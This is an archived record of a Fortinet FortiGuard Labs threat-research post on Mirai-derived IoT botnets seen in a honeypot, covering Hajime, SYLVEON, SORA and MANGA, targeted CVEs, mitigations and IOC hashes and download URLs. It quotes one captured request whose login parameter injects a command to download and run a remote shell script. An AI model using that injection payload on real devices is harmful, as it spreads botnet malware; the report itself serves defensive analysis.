{
    "id": "71ad82c6-1520-4d67-80ac-855545afee15",
    "created_at": "2023-01-12T15:06:25.024765Z",
    "updated_at": "2025-03-27T02:05:53.450169Z",
    "deleted_at": null,
    "sha1_hash": "70803b24af97056b878490262f4c317fd0123ce0",
    "title": "2021-06-24 - The Ghosts of Mirai",
    "authors": "",
    "file_creation_date": "2022-05-28T15:25:12Z",
    "file_modification_date": "2022-05-28T15:25:12Z",
    "file_size": 200217,
    "plain_text": "# The Ghosts of Mirai\n\n**fortinet.com/blog/threat-research/the-ghosts-of-mirai**\n\n**[FortiGuard Labs Threat Research Report](https://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs)**\n\n**Affected Platforms: Linux**\n\n**Impacted Users:   Any organization**\n**Impact:           Remote attackers gain control of the vulnerable systems**\n\n**Severity Level:     Critical**\n\n\nJune 24, 2021\n\n\n[It has been almost five years since the source code of the notorious MIRAI IoT](https://www.fortinet.com/resources/cyberglossary/iot-security?utm_source=blog&utm_campaign=iot-security) [malware](https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&utm_campaign=malware)\nwas [released to the public by its author in late 2016. This event led to the emergence of](https://krebsonsecurity.com/2016/10/source-code-for-iot-botnet-mirai-released/)\nnumerous copycats, creating their own flavors of IoT botnet armies. Although improvements\nhave been constantly added since then by various threat actors, the structure and goal of the\ncampaigns have remained the same.\n\n\n-----\n\nIoT malware scans the Internet for IoT devices that use default or weak usernames and\n[passwords. They also seek to exploit known—and sometimes even zero-day—vulnerabilities](https://www.fortinet.com/blog/threat-research/rise-of-one-more-mirai-worm-variant?utm_source=blog&utm_campaign=rise-of-one-more-mirai-worm-variant)\nto increase their chances of gaining access. And once they do, malicious binaries are\ndownloaded and executed that make the device part of a zombie network that could then be\ninstructed to participate in a Distributed Denial-of-Service (DDOS) attack that could cause a\nservice outage to an unfortunate target. Some threat actors even sell these curated botnets\nas a service.\n\nWe have been closely monitoring the current state of the IoT botnet threat landscape through\nthe perspective of an IoT device with the help of a honeypot system. This article describes\nour observations over the last few weeks.\n\n## Where are These Attacks Coming From?\n\nTo simulate what it would be like for a new IoT device to be connected to the internet for the\nfirst time, we set up a fresh honeypot system to capture what kinds of attacks it would\nreceive. This honeypot was designed to be vulnerable to telnet credential brute force attacks.\nThe statistics in this article were taken from a three-week period.\n\nOn average, this honeypot system received around 200 attacks per day, ultimately recording\nnearly 4700 telnet connections in just three weeks. We were then able to identify nearly 4000\nof those attacks and connect them to a Mirai-related malware family.\n\nFigure 1 Number of telnet connections per day\n\nSince this honeypot does not execute any of the downloaded binaries, most of the attacks\nkeep retrying until their malware has executed in the system. By removing IP duplicates, the\nactual number of attack sources was obtained and is broken down in the next table.\n\nFigure 2 Unique telnet source IPs per country\n\n## Top IoT Malware Variants\n\nMirai variant authors use unique strings or tokens in their binaries that are used to verify\nwhether SSH or Telnet commands were successfully executed in the device—although this\ncould also be used by the threat actors to advertise their malware or, in some cases, simply\nas a placeholder for novelty messages.\n\nThe figure below shows a sequence of commands that the SORA Mirai variant executes\nimmediately after gaining access to a device.\n\nFigure 3 Sample shell commands executed by a SORA bot\n\n\n-----\n\nThese strings have been heavily used by researchers over time to classify variants.\nHowever, there are cases where variants may use different tokens but turn out to be the\nsame malware function-wise—and are even operated by the same threat actor. In such\ncases, analyzing the actual binary being downloaded into the device would greatly help\nfurther define the number of existing variants.\n\nBased on the attacks received by the honeypot, the following table shows the top 10 variants\nwe were able to identify.\n\nFigure 4 Top ten identified variants\n\n## The Enigmatic “Hajime”\n\n[Hajime was dubbed as the successor to the first generation of Mirai. Built on the same](https://www.fortinet.com/blog/industry-trends/fighting-the-evolution-of-malware?utm_source=blog&utm_campaign=fighting-the-evolution-of-malware)\nprinciple and goals as of its predecessor, it tries to propagate to IOT devices by means of\nbrute-forcing credentials using a password list of common default device passwords.\nHowever, unlike Mirai, Hajime utilizes a decentralized peer-to-peer network to issue\ncommands to its bots. This makes it much harder to locate the Command-and-Control (C2)\nserver for a takedown.\n\nAside from its sophisticated bot network communication, it is also one of the most mysterious\nvariants due to its vague intentions. Commands sent to Hajime bots are in the form of\nstructured messages that are passed along in the peer-to-peer network. One of these\ncommands instruct bots to download and execute binaries, internally called \"modules\". Only\nthe spreading module has been observed being served in the wild. No attack or disruptive\nmodules have been observed, and Hajime has never been associated with any disruption\nattacks. Furthermore, part of its behavior is to block access to ports that are commonly\ntargeted by other IoT malware, thereby inadvertently (or not) somewhat protecting the\ninfected device from further infections.\n\nLastly, it delivers the following message to the device’s terminal:\n\n**_Just a white hat, securing some systems._**\n\n**_Important messages will be signed like this!_**\n\n**_Hajime Author._**\n\n**_Contact CLOSED Stay sharp!_**\n\nIt was only a matter of time before some speculated that Hajime might be the work of a real\nvigilante.\n\n## SYLVEON Coming Out of Retirement?\n\n\n-----\n\nWhat surprised us more was the appearance of the SYLVEON variant on the table. In mid2019 there was a 14-year old European IoT malware author that went by the name of “Light\nThe Sylveon” and “Light The Leafeon”.\n\nWhen we took quick look at the decrypted strings of one of the binaries we captured, the\nword “Leafeon” was found, creating speculation that this might be the author’s comeback.\n\nFigure 5 Strings found in SYLVEON binaries\n\n[“Light the Sylveon” co-created the destructive SILEX IoT malware, whose goal was to render](https://www.bleepingcomputer.com/news/security/new-silex-malware-trashes-iot-devices-using-default-passwords/)\n[vulnerable devices inoperable by running destructive commands–very similar to BrickerBot.](https://www.fortinet.com/blog/threat-research/bricker-bot-a-silver-lining-to-force-accountability-for-iot-security?utm_source=blog&utm_campaign=bricker-bot-a-silver-lining-to-force-accountability-for-iot-security)\nFrom the malware authors’ perspective, based on a message embedded in the malware’s\nbinary, this was to “prevent skids to flex their skidded botnet.”\n\nEventually, the “Light The Sylveon” author announced through a post on his twitter account\nthat he was going to abandon the project.\n\nFigure 6 \"Light The Sylveon\" announces quitting on a twitter post\n\nUnlike SILEX, however, SYLVEON is a conventional IoT malware that was clearly based on\nthe Mirai source code with some added attacks.\n\nFigure 7 Function name list found in a SYLVEON binary\n\nInterestingly enough, the group greek.Helios and a certain Thar3seller, which were a group\n[previously associated with other IoT malware campaigns, currently claim to be the authors of](https://threatpost.com/dark_nexus-botnet-asus-dlink-routers/154571/)\nthis variant.\n\nFigure 8 Strings found in a SYLVEON binary\n\nThe relationship between these different authors is still unclear. What we are certain about is\nthat this variant is being actively operated, as also shown by recently updated binaries found\nin one of its download servers.\n\nFigure 9 Open directory hosting SYLVEON variant\n\n## SORA - The Surviving Member of the Wicked Family\n\nIt is also interesting to see Mirai variants that were authored by the threat actor known\nas Wicked that we [covered three years ago. These variants include Owari, Omni, Wicked,](https://www.fortinet.com/blog/threat-research/a-wicked-family-of-bots?utm_source=blog&utm_campaign=a-wicked-family-of-bots)\nand SORA. Based on an interview at that time, the author stated he was going to focus on\nOwari and Omni while abandoning the other two variants, including SORA. Based on our\nobservastions, it seems that SORA has more successfully survived than its siblings.\n\n\n-----\n\n## Mirai Variant MANGA Actively Updates its List of Targeted Vulnerabilities\n\nAside from the honeypot, we have also been monitoring Mirai variants from other sources. In\nparticular, we have been closely monitoring the developments of the MANGA variant\nbecause it is one of the most active in terms of adding new exploit vectors to its list.\n\nIn fact, just a week ago, it added several more exploits, two of which are fairly recent:\n\n**[OptiLink ONT1GEW GPON](https://packetstormsecurity.com/files/162993/OptiLink-ONT1GEW-GPON-2.1.11_X101-Remote-Code-Execution.html)** **Remote Code Execution (formTracert function)**\n\nFigure 10 Sample request leading to an RCE on OptiLink GPON\n\n**[CVE-2021-1498 (Cisco HyperFlex HX Remote Code Execution)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-1498)**\n\nFigure 11 Sample request targeting CVE-2021-1498\n\n**[CVE-2021-31755 (Tenda Router AC11 Remote Code Execution)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31755)**\n\nFigure 12 Sample request targeting CVE-2021-31755\n\n**Unknown 1 (Unidentified target)**\n\nSample request:\n\nFigure 13 Sample request targeting an unknown target\n\nHere is a list of other vulnerabilities this malware variant tries to exploit:\n\n**Vulnerability** **Description**\n\n**[CVE-2021-22986](https://support.f5.com/csp/article/K03009991)** F5 iControl REST Remote Code Execution\n\n**[CVE-2009-4490](https://nvd.nist.gov/vuln/detail/CVE-2009-4490#:~:text=CVE%2D2009%2D4490%20Detail&text=mini_httpd%201.19%20writes%20data%20to,sequence%20for%20a%20terminal%20emulator.)** mini_httpd 1.18 Escape Sequence\n\n**[CVE-2018-10088](https://nvd.nist.gov/vuln/detail/CVE-2018-10088)** XiongMai uc-httpd Buffer Overflow\n\n**[CVE-2020-28188](https://nvd.nist.gov/vuln/detail/CVE-2020-28188)** TerraMaster TOS Remote Code Execution\n\n**[CVE-2020-29557](https://nvd.nist.gov/vuln/detail/CVE-2020-29557)** D-Link DIR-825 Buffer Overflow\n\n**[CVE-2020-25506](https://nvd.nist.gov/vuln/detail/CVE-2020-25506)** D-Link DNS-320 Remote Code Execution\n\n\n-----\n\n**[CVE-2021-22502](https://nvd.nist.gov/vuln/detail/CVE-2021-22502)** Micro Focus OBR Remote Code Execution\n\n\n**CVE-2021-**\n**[27561/CVE-2021-](https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/)**\n**27562**\n\n\nYealink DM (Device Management) Remote Code Execution\n\n\n**[CVE-2021-22991](https://support.f5.com/csp/article/K56715231)** F5 BIG-IP Buffer Overflow\n\n\n**[VisualDoor(2021-](https://www.exploit-db.com/exploits/49499)**\n_01-29)_\n\n\nSonicWall SSL-VPN Remote Code Execution\n\n\n**Unknown 2** _key parameter on /cgi-bin/login.cgi leading to Remote Code_\nExecution\n\nSample request:\n\n**POST /cgi-bin/login.cgi HTTP/1.1**\n\nConnection: keep-alive\n\nContent-Type: application/x-www-form-urlencoded\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0)\nGecko/20100101 Firefox/60.0\n\nkey=';`cd /tmp; wget http://{REDACTED IP}/lolol.sh; curl -O\nhttp://{REDACTED IP}/lolol.sh; chmod 777 lolol.sh; sh lolol.sh;`;#\n\nFigure 14 List of other vulnerabilities being targeted by Manga\n\n## Conclusion\n\nAs the number of installed IoT devices continues to explode, especially given the current lack\nof security standards available to protect them, IoT will be a hotbed for malware operations\nfor the foreseeable future, as we have demonstrated in this article. And interestingly, Mirai\nvariants are still very active in terms of attack and development.\n\n**Solutions**\n\nEvery artifact collected from our honeypot systems and other sources are automatically\nprocessed to ensure that our customers are protected from these attacks. That said, the\nfollowing precautions are highly recommended:\n\n\n-----\n\nAs credential brute-forcing is still the primary way malwares get into IoT devices,\nsetting usernames and passwords that are difficult to guess can go a long way towards\nsecuring them.\nIn addition, to protect against known vulnerabilities, always keep device software up to\ndate.\n\nFortinet customers are protected by the following:\n\nRelated samples are detected by FortiGuard Antivirus\nDownloaded URLs and identified C2s are blocked by FortiGuard Web Filtering Service.\nMentioned exploit attacks are detected using the following IPS signatures:\n\n[CVE-2021-22986 - F5.iControl.REST.Interface.Remote.Command.Execution](https://www.fortiguard.com/encyclopedia/ips/50002)\nCVE-2009-4490- [Acme.thttpd.and.minihttpd.Command.Injection.Vulnerability](https://www.fortiguard.com/encyclopedia/ips/37660)\n[CVE-2018-10088 - XiongMai.uc-httpd.Buffer.Overflow](https://www.fortiguard.com/encyclopedia/ips/46264)\nCVE-202028188- [TerraMaster.TOS.Makecvs.PHP.Unauthenticated.Command.Execution](https://www.fortiguard.com/encyclopedia/ips/49716)\n[CVE-2020-25506 - D-Link.ShareCenter.Products.CGI.Code.Execution](https://www.fortiguard.com/encyclopedia/ips/31320)\nCVE-2020-29957 - D-Link.DIR.825.Buffer.Overflow\nCVE-2021-22502- [Micro.Focus.Operations.Bridge.Reporter.Command.Injection](https://www.fortiguard.com/encyclopedia/ips/50001)\nCVE-2021-27561/CVE-202127562 - [Yealink.Device.Management.Platform.Command.Injection](https://www.fortiguard.com/encyclopedia/ips/50000)\nCVE-2021-22991 - [F5.BIG.IP.TMM.URI.Normalization.Buffer.Overflow](https://www.fortiguard.com/encyclopedia/ips/49979)\n[VisualDoor RCE - Bash.Function.Definitions.Remote.Code.Execution](https://www.fortiguard.com/psirt/FG-IR-14-030)\nOptiLink ONT1GEW GPON RCE\n\n     - Optilink.GPON.Router.formTracert.Remote.Command.Execution\n[CVE-2021-1498 - Cisco.HyperFlex.HX.storfs-asup.Handling.Command.Injection](https://www.fortiguard.com/encyclopedia/ips/50411)\n\n## IOCs\n\n**MANGA**\n\nFiles (SHA256)\n\n25fcefa76d1752b40b33f353332ddb48b3bae529f0af24347ffeffc5e1acd5cd\n\n5312cb57d8c38ab349a9d67db65c66a733758cb29eb118c958ede11a98322c8a\n\n6075c917e2b25ff2def7cdb3019e0ad725a02387c9e1e83cb6514bd410c8f928\n\nfd2aed69644ff8edcc501945ca5e83d548c6c346d3e92c922eeb3f5da03f9b8d\n\n626e1a247045dff09c4b6aa5de8d9b9d1d385846306a359587f42b60d4413258\n\n68601bae31381d2205dd16df1f2aff52592f9a9aad71ea5f60f68321c6aea579\n\n40066f30b72b4184b33e834712832879f8814ddaf56c71f33bbaacb890c350f0\n\n51ffd3c3e1b10b629692b3b1120c777388ae73c61469bb2926d2a70a457ea14d\n\nfee1a5ceea21f14b60f0d632a2889bf3ef81f45eb783e53ada44b9b2f8e4a4a\n\n7df6c4d3bc4f528c5928e3ef09feb532e3407f893af02c16437e669390d6a09f\n\neb64753c578138157eeff8ba1087a94538f1337bd4c6d09ac26806cb12ff69c1\n\n\n-----\n\nef57d97bffb2ef7a435fe6668d0aba12196cd91ee1cd3d5446ad525995b76b8d\nc9845823a32b9b5ff59f76771c90e4f23c8f94e9013051797cfd4efdf43c4d4f\n1a2bc7e97c73efbbbe4a7ad0f577c2b3585f1fe15a3fdb82bd79f13906d838d0\nca9965127cfdae9e2d8b228af0ab691589ac27cc5ca17a3377de2e8551b64f9f\n49e5ba121c216146cdcf63ebade1853a3710fa266f8c456e3dcee0565e6bdbb1\n1bb9bda36b1d2a8963e5a2687ce4645a02805ad0ccb74a0b234cdb9503fdd8e3\nf19c64746eddcd33daa30df9c9f282863ad05b22e2f143382f0ab18547cd6497\nec7f7a791e7bca70b5143bbe9064124ae05cdfc13a3c7ab295b6f555eda1ed7d\n\nDownload URLs\nhttp[:]//212.192.241.72/bins/dark.mpsl\nhttp[:]//212.192.241.72/bins/dark.arm5\nhttp[:]//212.192.241.72/bins/dark.arm6\nhttp[:]//212.192.241.72/bins/dark.arm7\nhttp[:]//212.192.241.72/bins/dark.x86\nhttp[:]//212.192.241.72/bins/dark.ppc\nhttp[:]//212.192.241.72/bins/dark.mips\n\n**Hajime**\n\nFiles (SHA256)\na04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3\nDownload URLs\nhttp[:]//121.121.122.176:29641/.i\nhttp[:]//121.162.45.6:38828/.i\nhttp[:]//125.227.193.220:38674/.i\nhttp[:]//130.164.183.217:62624/.i\nhttp[:]//14.42.160.123:19634/.i\nhttp[:]//147.234.71.142:7011/.i\nhttp[:]//171.232.247.121:63812/.i\nhttp[:]//171.247.233.69:36829/.i\nhttp[:]//175.115.103.118:8450/.i\nhttp[:]//178.116.76.54:20060/.i\nhttp[:]//183.108.201.171:32745/.i\nhttp[:]//184.82.56.195:58027/.i\nhttp[:]//187.233.194.166:3181/.i\nhttp[:]//187.37.198.126:14552/.i\nhttp[:]//189.132.235.210:43064/.i\nhttp[:]//189.173.97.200:41775/.i\nhttp[:]//190.18.221.214:51789/.i\nhttp[:]//2.45.4.24:50436/.i\n\n\n-----\n\nhttp[:]//201.105.177.84:25768/.i\nhttp[:]//210.99.125.95:56779/.i\nhttp[:]//211.107.151.26:26593/.i\n\nSample commands after gaining access:\n\n**SYLVEON**\n\nFiles (SHA256)\n2bdd553ad6485d11844c6cb68ae63f083c7f2ee6029f128a1521427e9a29aad5\n311ac01e395d96f8017ef95dfa9ee8f00aa527e02cfcd207de371e04e5aed023\n4a4b8fdbe2cff3547e6d808226d34cf6059d9160326326d3b90d851e602035d8\n7edb2ff320e99a1b92c7fa51dcd485edbc15eb4d23520ee26ed0d42600a733a1\n4bbf2dab9cce066bab887e0058150157f0417d6dceca64025ce2127a8eb584b0\n208ae3086c769098f1a55ac6d88fb760571010c16f4a0e25c98ee0d33d4bdbbc\nfac943c6173cf183e53bea76d4f6b07dbb455ec3dc98dda71164267fc7e1dbb4\n\nDownload URLs\nhttp[:]//31.210.20.138/uwu/arm6\n[http[:]//31.210.20.138/uwu/ppc](https://www.virustotal.com/gui/url/e4ffd6f14f58daea8fde73ec3af9ae3b4ac096c1c677d9b11470f3c247532a03)\n[http[:]//31.210.20.138/arm6](https://www.virustotal.com/gui/url/948ca9d3549f6729b41a235cdd024ded718f80a3dd27f4f92992508bf3443085)\n[http[:]//31.210.20.138/sh4](https://www.virustotal.com/gui/url/01e345afc2a5717d51043379842084380f901355e6722afcb4bd8f578584c538)\n[http[:]//45.153.203.219/uwu/arm6](http://45.153.203.219/uwu/arm6)\nhttp[:]//45.95.169.110/bins/m68k\n\nSample commands after gaining access:\n\n_Learn more about Fortinet’s_ _[FortiGuard Labs threat research and intelligence organization](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs)_\n_[and the FortiGuard Security Subscriptions and Services portfolio.](https://www.fortinet.com/fortiguard/labs?tab=security-bundles&utm_source=blog&utm_campaign=security-bundles)_\n\n_Learn more about Fortinet’s_ _[free cybersecurity training, an initiative of Fortinet’s Training](https://www.fortinet.com/training/cybersecurity-professionals?utm_source=blog&utm_medium=campaign&utm_campaign=Freetraininginitiative)_\n_Advancement Agenda (TAA), or about the_ _Fortinet Network Security Expert_\n_[program, Security Academy program, and](https://training.fortinet.com/local/staticpage/view.php?page=fnsa&utm_source=pr&utm_campaign=fnsa)_ _[Veterans program.](https://www.fortinet.com/corporate/careers/vets.html?utm_source=blog&utm_campaign=fortivet)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-24 - The Ghosts of Mirai.pdf"
    ],
    "report_names": [
        "2021-06-24 - The Ghosts of Mirai.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535985,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653751512,
    "ts_modification_date": 1653751512,
    "files": {
        "pdf": "https://archive.orkl.eu/70803b24af97056b878490262f4c317fd0123ce0.pdf",
        "text": "https://archive.orkl.eu/70803b24af97056b878490262f4c317fd0123ce0.txt",
        "img": "https://archive.orkl.eu/70803b24af97056b878490262f4c317fd0123ce0.jpg"
    }
}